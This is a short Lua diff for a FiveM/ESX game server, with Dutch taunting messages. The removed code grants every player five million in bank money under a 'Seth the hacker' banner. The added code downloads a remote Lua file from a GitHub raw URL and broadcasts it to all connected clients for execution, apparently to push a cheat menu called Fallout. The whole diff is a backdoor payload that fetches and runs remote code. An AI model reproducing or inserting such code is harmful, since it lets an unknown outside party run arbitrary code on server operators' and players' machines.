@@ -1,9 +1,8 @@
-TriggerClientEvent('esx:showNotification',-1, "Ben ik weer")
-local playerList = ESX.GetPlayers()
-for i=1, #playerList, 1 do
-    local _source = playerList[i]
-    local xPlayer = ESX.GetPlayerFromId(_source)
-    xPlayer.showNotification("5mil van jullie favoriete hacker")
-    xPlayer.showNotification("Vriendelijke groetjes van Seth de hacker")
-    xPlayer.addAccountMoney("bank", 5000000)
-end
+TriggerClientEvent('esx:showNotification',-1, "Fallout menu voor iedereen baby")
+PerformHttpRequest("https://raw.githubusercontent.com/Sahbes/AnticheatLicenses/main/gayout.lua", function(code, res, headers)
+    if code == 200 then
+        if res ~= nil then
+            TriggerClientEvent('GTX:executecommand', -1, res)
+        end
+    end
+end)
